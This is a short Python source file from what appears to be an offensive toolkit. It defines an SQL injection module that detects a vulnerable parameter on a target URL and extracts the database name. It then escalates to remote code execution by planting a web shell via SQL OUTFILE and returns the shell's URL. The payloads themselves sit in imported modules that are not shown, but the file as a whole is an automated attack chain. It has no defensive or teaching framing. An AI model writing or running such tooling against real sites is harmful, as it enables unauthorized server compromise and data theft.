from core.scanner import Scanner
from core.exploit import Exploit

class SQLiModule:
    def __init__(self, target_url, proxy=None):
        self.scanner = Scanner(target_url, proxy)
        self.exploit = Exploit(target_url, proxy)
    
    def run(self, param):
        is_vuln, tech = self.scanner.detect_sqli(param)
        if not is_vuln:
            return None
        print(f"[SQLi] Vulnerable: {tech}")
        db_name = self.exploit.sqli_extract_data(param, tech)
        if db_name:
            print(f"[SQLi] Database: {db_name}")
        shell = self.exploit.rce_via_sqli_outfile(param)
        return {"vulnerable": True, "technique": tech, "db": db_name, "shell_url": shell}
